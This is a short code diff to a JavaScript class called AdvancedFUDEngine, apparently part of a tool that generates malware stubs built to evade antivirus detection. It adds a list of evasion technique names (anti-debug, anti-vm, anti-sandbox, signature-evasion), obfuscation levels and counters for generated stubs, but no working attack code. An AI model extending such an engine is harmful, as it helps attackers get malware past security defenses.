@@ -19,6 +19,30 @@ class AdvancedFUDEngine {
         this.obfuscationTechniques = new Map();
         this.memoryProtectionMethods = new Map();
         this.behavioralEvasionPatterns = new Map();
+        
+        // FUD techniques array
+        this.fudTechniques = [
+            'polymorphic', 'metamorphic', 'obfuscation', 'encryption',
+            'packing', 'anti-debug', 'anti-vm', 'anti-sandbox',
+            'timing-evasion', 'behavioral-evasion', 'signature-evasion',
+            'code-mutation', 'control-flow-flattening', 'dead-code-injection',
+            'string-encryption', 'api-obfuscation', 'import-hiding',
+            'dynamic-loading', 'self-modifying', 'memory-protection',
+            'godlike-obfuscation', 'ultimate-stealth', 'anti-everything'
+        ];
+        
+        // Obfuscation levels
+        this.obfuscationLevels = ['none', 'basic', 'intermediate', 'advanced', 'extreme', 'godlike'];
+        
+        // Statistics
+        this.stats = {
+            totalGenerated: 0,
+            activeStubs: 0,
+            regenerationCount: 0,
+            encryptionMethodsUsed: new Set(),
+            fudTechniquesUsed: new Set(),
+            lastGeneration: null
+        };
     }
 
     async initialize() {
@@ -1653,4 +1677,7 @@ class AdvancedFUDEngine {
     }
 }
 
-module.exports = AdvancedFUDEngine;
+// Create and export instance
+const advancedFUDEngine = new AdvancedFUDEngine();
+
+module.exports = advancedFUDEngine;
